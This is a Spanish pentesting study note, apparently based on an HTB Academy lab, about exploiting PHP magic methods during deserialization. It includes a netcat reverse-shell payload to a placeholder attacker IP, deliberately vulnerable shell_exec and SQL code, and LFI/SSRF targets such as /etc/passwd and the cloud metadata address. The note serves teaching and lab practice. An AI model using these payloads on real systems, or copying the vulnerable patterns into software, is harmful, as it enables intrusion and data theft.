---
tags:
  - Web/Red-Team
  - Deserializacion
  - Pentesting/Explotacion
Descripción: "Los magic methods de PHP que se disparan al deserializar, cómo un __wakeup vulnerable da RCE y cómo la deserialización alimenta SQLi, LFI y SSRF"
Fecha de actualización: 2026-11-20
Nota previa: "[[04 - Object injection en PHP]]"
Nota siguiente: "[[06 - Deserialización PHAR - sinks que no parecen sinks]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

La deserialización se convierte en ejecución de código a través de los **`magic methods`**: funciones con nombre `__` que PHP invoca automáticamente en momentos del ciclo de vida de un objeto. <mark style="background: #ADCCFFA6;">El atacante no llama a ninguna función; se limita a provocar el evento —deserializar— y PHP dispara el hook por él</mark>. Si ese hook hace algo peligroso con una propiedad controlada, hay RCE.

# El catálogo y cuáles importan

PHP define 17 `magic methods`. Para deserialización, los que se disparan sin intervención del código de la aplicación son el objetivo:

| Método | Se dispara cuando... | Relevancia ofensiva |
| --- | --- | --- |
| `__wakeup` | Se deserializa el objeto (`unserialize`) | **Alta** — punto de entrada directo |
| `__unserialize` | Se deserializa (PHP 7.4+) | **Alta** — sustituye a `__wakeup` si ambos existen |
| `__destruct` | El objeto se destruye al final del script | **Alta** — el `gadget` final de casi todas las cadenas |
| `__toString` | El objeto se usa como cadena (`echo`, concatenación) | Media — enlaza a SSRF, LFI, SQLi |
| `__call` / `__get` / `__set` | Se accede a método/propiedad inaccesible | Media — pivota a otros `sinks` |
| `__invoke` | El objeto se llama como función `$obj()` | Media — en cadenas complejas |

<mark style="background: #FFB8EBA6;">`__wakeup` y `__destruct` son los dos extremos de la vida del objeto deserializado, y por eso son los más explotados</mark>: `__wakeup` corre nada más reconstruir, `__destruct` corre al terminar el script pase lo que pase. Las cadenas de `gadgets` de [[07 - PHPGGC y cadenas de gadgets|PHPGGC]] casi siempre arrancan en uno de los dos.

> [!warning]+ Precedencia: `__unserialize` gana a `__wakeup`
> Desde PHP 7.4, si una clase define **ambos**, se ejecuta `__unserialize` y `__wakeup` se ignora (confirmado en el manual: *«If both `__unserialize()` and `__wakeup()` are defined in the same object, only `__unserialize()` will be called»*). Lo mismo del lado de serializar con `__serialize` y `__sleep`. Confundir cuál corre lleva a apuntar al hook equivocado y no disparar nada. Verificar qué define la clase objetivo antes de elegir el vector.

> [!info]+ `__wakeup`/`__sleep` están soft-deprecated desde PHP 8.5
> Desde PHP 8.5.0 el mecanismo `__sleep`/`__wakeup` está marcado como *soft-deprecated* (solo documental): el manual recomienda migrar a `__serialize`/`__unserialize`, pero <mark style="background: #FFB8EBA6;">**no** se emite ningún `Deprecated:` en runtime</mark> — el RFC que proponía la deprecación dura se quedó en aviso documental. Implicación ofensiva: `__wakeup` no desaparece ni deja de ser explotable (la compatibilidad está garantizada), pero el código nuevo migra a `__unserialize`. Durante los próximos años hay que **buscar los dos**.

# De magic method a RCE directa

La clase `UserSettings` del módulo define un `__wakeup` que registra la importación en un log:

```php
public function __wakeup() {
    shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \''
        . $this->getName() . '\'" >> /tmp/htbank.log');
}
```

El fallo es evidente una vez señalado: <mark style="background: #FF5582A6;">`$this->getName()` —propiedad que el atacante controla— se concatena dentro de un comando que va a `shell_exec` sin ninguna sanitización</mark>. Es una [[00 - Introducción a Command Injection|inyección de comandos]] de manual, pero alcanzada por deserialización: no hay un parámetro `?name=` en la URL, el valor llega dentro del objeto serializado.

Se rompe el `echo` con `";` y se añade el comando propio:

```php
new \App\Helpers\UserSettings(
    '"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash; #',
    'attacker@htbank.com', '$2y$10$...', 'default.jpg'
);
```

Al deserializar, PHP dispara `__wakeup`, el `echo` se cierra, el `nc` se ejecuta y vuelve una `shell`. El `#` comenta el resto de la línea para que no estorbe.

> [!important]+ Depurar el comando sin ejecutarlo
> Antes de disparar contra el objetivo, en el [[03 - PHP - del sink al laboratorio local|arnés local]] conviene sustituir el `shell_exec` por un `print` del comando construido. Así se lee exactamente qué cadena llegaría a la `shell` —incluyendo cómo quedan las comillas tras el `mangling` y el Base64— y se corrige el `quoting` antes de gastar un disparo real. Dejar el `shell_exec` activo en el arnés ejecuta el `nc` en la máquina del propio pentester.

# Cuando no hay un hook vulnerable: otros sinks

Lo potente del concepto es que la deserialización no está atada a la ejecución de comandos. Según qué `magic methods` haya, el objeto deserializado alimenta otros `sinks`:

- **SQL injection.** Un `__get` que consulta la base de datos construyendo la query con el nombre de la propiedad accedida:

```php
function __get($get) {
    $result = mysqli_query($con, "SELECT " . $get . " FROM users WHERE id = " . $this->id);
}
```

Controlando la propiedad que se accede, se controla la columna de la `SELECT` — [[00 - Introducción a SQL Injection|SQLi]] a través de un `magic method`. El módulo lo ilustra extrayendo nombres de tabla con un `group_concat` metido en el nombre de propiedad.

- **LFI / SSRF.** Un `__toString` o un `__wakeup` que abre un fichero o una URL con una propiedad controlada: `file_get_contents($this->path)` da [[00 - Introducción a File Inclusion|LFI]] si `path` apunta a `/etc/passwd`, o [[01 - Introducción a SSRF|SSRF]] si apunta a `http://169.254.169.254/`.
- **DoS.** Objetos recursivos o que consumen recursos al reconstruirse.

<mark style="background: #8000E1A6;">El objeto deserializado es un primitivo genérico: la deserialización lo entrega, y a partir de ahí vale cualquier `sink` al que una propiedad controlada llegue</mark>. Encontrar el `sink` adecuado dentro de los `magic methods` disponibles es el ejercicio creativo del ataque, y es también lo que automatizan las cadenas de `gadgets` cuando la clase objetivo no trae ningún hook vulnerable de regalo.

# El salto a las cadenas de gadgets

El caso de `HTBank` es cómodo porque la clase que importa trae un `__wakeup` con `shell_exec`. En código real eso es raro: lo normal es que ninguna clase accesible tenga un hook directamente explotable. Ahí entra encadenar **clases ajenas** —del framework, de `vendor/`— cuyos `magic methods` se llaman entre sí hasta construir, pieza a pieza, una llamada a un `sink`. Esa es la técnica de [[07 - PHPGGC y cadenas de gadgets]].

> [!info]+ Fuentes
> Lista y comportamiento de los `magic methods`, incluida la precedencia `__unserialize`/`__wakeup`: [manual de PHP — Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php). Ranking de uso en proyectos reales: [Exakat — Most Popular PHP Magic Methods](https://www.exakat.io/en/most-popular-php-magic-methods/). Casos SQLi/LFI/SSRF vía deserialización adaptados del módulo 169 de HTB Academy.
